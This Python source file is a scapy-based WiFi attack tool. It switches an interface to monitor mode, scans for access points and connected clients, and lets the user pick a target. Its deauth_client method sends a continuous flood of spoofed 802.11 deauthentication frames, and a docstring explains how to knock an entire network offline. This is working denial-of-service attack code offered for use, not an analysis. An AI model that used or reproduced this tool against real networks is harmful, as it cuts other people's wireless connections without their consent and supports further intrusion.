# TODO the deauth part with one or more clients..
import signal
import time
from scapy.all import *
import subprocess
from rich.table import Table
from threading import Thread
import pandas as pd
import os
import psutil

class WiFi:
    def __init__(self, interface, console):
        self.interface = interface
        self.console = console
        self.networks = pd.DataFrame(columns=["BSSID", "SSID", "dBm_Signal", "Channel", "Crypto", "Data_Count"])
        self.networks.set_index("BSSID", inplace=True)

        if not self._is_monitor_mode(self.interface):
            self._set_monitor_mode(self.interface)
        
        self.stop_sniffing = False
        self.client_list = []
        self.stop_client_scan = False
        self.deauth = False
    
    #########################################
    ##########   Manage interface   #########
    #########################################

    def _set_monitor_mode(self, interface):
        # Bring the interface down.
        os.system(f'ifconfig {interface} down')
        # Set the mode to monitor.
        os.system(f'iwconfig {interface} mode monitor')
        # Bring the interface back up.
        os.system(f'ifconfig {interface} up')

    def _is_monitor_mode(self, interface):
    
        try:
            # Run iwconfig and capture the output
            result = subprocess.check_output(f"iwconfig {interface}", shell=True, stderr=subprocess.DEVNULL)
            output = result.decode()

            # Check if 'Mode:Monitor' is in the output
            if "Mode:Monitor" in output:
                return True
            else:
                return False
        except subprocess.CalledProcessError:
            return False
    
    #########################################
    ########## The network scan part ########
    #########################################

    def scan_networks(self):
        signal.signal(signal.SIGINT, self._signal_handler)

        printer = Thread(target=self._print_all)
        printer.daemon = True
        printer.start()

        channel_changer = Thread(target=self._change_channel)
        channel_changer.daemon = True
        channel_changer.start()

        sniff(prn=self._callback, iface=self.interface, stop_filter=lambda x: self.stop_sniffing, store=0)

        return self._choose_network() 

    def _callback(self, packet):
        if packet.haslayer(Dot11Beacon):
            try:
                # Extract the BSSID (MAC address of the access point)
                bssid = packet[Dot11].addr2
                if not bssid:
                    return  # Skip if BSSID is not valid

                # Extract SSID (network name), handle hidden SSID
                ssid = packet.info.decode(errors="ignore") if packet.info else "Hidden SSID"
                dbm_signal = getattr(packet, "dBm_AntSignal", "N/A")

                # Extract channel and encryption details
                stats = packet[Dot11Beacon].network_stats()
                channel = stats.get("channel", "Unknown")
                crypto = ", ".join(stats.get("crypto", []))

                # Add new network entry if BSSID is not already in the table
                if bssid not in self.networks.index:
                    new_entry = pd.DataFrame([[ssid, dbm_signal, channel, crypto, 0]],  # Initialize Data_Count to 0
                                             columns=["SSID", "dBm_Signal", "Channel", "Crypto", "Data_Count"],
                                             index=[bssid])
                    self.networks = pd.concat([self.networks, new_entry])
                    self._print_all()

            except Exception as e:
                print(f"Error processing beacon packet: {e}")

        
        elif packet.haslayer(Dot11):
            # Check if it's a data packet (Type 2) - represents actual traffic
            if packet.type == 2 and packet.addr3 in self.networks.index:
                try:
                    # Increment the Data_Count for this BSSID
                    self.networks.at[packet.addr3, 'Data_Count'] += 1
                except Exception as e:
                    print(f"Error updating data count: {e}")


    def _change_channel(self):
        ch = 1
        while not self.stop_sniffing:
            os.system(f"iwconfig {self.interface} channel {ch}")
            ch = ch % 14 + 1
            time.sleep(0.5)

    def _print_all(self):
        os.system("clear")
        table = Table(title="Scanned WiFi Networks")
        table.add_column("Index", justify="center", style="yellow")
        table.add_column("SSID", justify="left", style="cyan")
        table.add_column("BSSID (Router MAC)", justify="left", style="magenta")
        table.add_column("Channel", justify="center", style="green")
        table.add_column("Signal (dBm)", justify="center", style="red")
        table.add_column("Crypto", justify="left", style="blue")
        table.add_column("Data Packets", justify="center", style="white")   

        if self.networks.empty:
            self.console.print("No networks found yet...", style="bold red")
        else:
            for idx, (bssid, row) in enumerate(self.networks.iterrows()):
                table.add_row(str(idx), row["SSID"], bssid, str(row["Channel"]),
                              str(row["dBm_Signal"]), row["Crypto"], str(row["Data_Count"]))
            self.console.print(table)


    def _choose_network(self):
        while True:
            choice = input("\nEnter the number of the network you want to scan clients for (or 'q' to quit): ").strip()

            if choice.lower() == 'q':
                print("Goodbye!")
                return None, None, None, None, None, None
            
            elif choice.isdigit():
                idx = int(choice)

                if 0 <= idx < len(self.networks):
                    selected_network = self.networks.iloc[idx]  # Fetch the selected row

                    id = idx
                    ssid = selected_network['SSID']
                    bssid = selected_network.name
                    channel = selected_network['Channel']
                    dBm_Signal = selected_network['dBm_Signal']
                    security = selected_network['Crypto']

                    return id, ssid, bssid, channel, dBm_Signal, security

                else:
                    print("Invalid selection. Please choose a valid network number.")
            else:
                print("Invalid input. Please enter a valid number or 'q' to quit.")


    def _signal_handler(self, sig, frame):
        self.stop_sniffing = True
        print("\nScanning stopped. Available networks:")
        self._print_all()

    #########################################
    ########## The client scan part #########
    #########################################

    def client_scan(self, bssid):
        signal.signal(signal.SIGINT, self._client_signal_handler)

        self.client_list.clear()  # Clear the list before scanning
        #print(f"\nScanning for clients connected to AP: {bssid} on {interface}...\n")

        def _client_packet_handler(pkt):
            if pkt.haslayer(Dot11) and pkt.type == 2:  # Data frame
                source = pkt.addr2
                destination = pkt.addr1
                if pkt.addr3 == bssid and source not in self.client_list:
                    self.client_list.append(source)
                    self._print_all_clients()
    

        sniff(iface=self.interface, prn=_client_packet_handler, stop_filter=lambda x: self.stop_client_scan, store=0)

        return self._chose_client()

    
    def _client_signal_handler(self, sig, frame):
        self.stop_client_scan = True
        #print("\nScanning stopped. Available clients:")
        self._print_all_clients()
    
    def _print_all_clients(self):
        os.system("clear")
        #self.console.clear()
        table = Table(title="Scanned Clients")
        table.add_column("Index", justify="center", style="yellow")
        table.add_column("Client MAC", justify="left", style="cyan")

        if not self.client_list:  # Correct way to check if list is empty
            print("No clients found")
        else:
            for idx, client in enumerate(self.client_list):
                table.add_row(str(idx), client)

            self.console.print(table)
            
    
    def _chose_client(self):
        while True:
            client_choice = input("\nChoose client by index or press 'q' to quit: ").strip()

            if client_choice.lower() == "q":
                print("Goodbye!")
                return None

            if client_choice.isdigit():
                idx = int(client_choice)

                if 0 <= idx < len(self.client_list):
                    # Store the selected client's MAC address
                    selected_client = self.client_list[idx]
                    # Remove the client from the list
                    self.client_list.pop(idx)
                    # Refresh the client table after removal
                    self._print_all_clients()
                    # Return the selected MAC
                    return selected_client
                else:
                    print("Invalid index. Please try again.")
            else:
                print("Invalid input. Please enter a valid number or 'q'.")

    def clear_wifi_data(self):
        self.client_list.clear()
        self.networks = pd.DataFrame(columns=["BSSID", "SSID", "dBm_Signal", "Channel", "Crypto", "Data_Count"])
        self.networks.set_index("BSSID", inplace=True)
        os.system(f'ifconfig {self.interface} down')
        # Set the mode to managed.
        os.system(f'iwconfig {self.interface} mode managed')
        # Bring the interface back up.
        os.system(f'ifconfig {self.interface} up')
    

    #########################################
    ##########    The deauth part   #########
    #########################################
    
    def deauth_client(self, gateway_mac, target_mac):
        """
        If you want to kill the whole network just use teh gateway_mac twice 
        """
        signal.signal(signal.SIGINT, self._deauth_signal_handler)

        #self.deauth = False 
        # Constructing 802.11 frame for deauthentication
        dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)

        # Stack layers: RadioTap (physical layer info), Dot11 frame, and Deauth frame
        packet = RadioTap() / dot11 / Dot11Deauth(reason=7)

        packets = 50

        try:
            while not self.deauth:
                
                # Send packets continuously with interval of 0.1 seconds
                sendp(packet, inter=0, count=packets, iface=self.interface, verbose=0)
                print(f"Sent {packets} packets.")

        except Exception as e:
            print(f"\n[!] Error occurred: {e}")
    
    def _deauth_signal_handler(self, sig, frame):
        self.deauth = True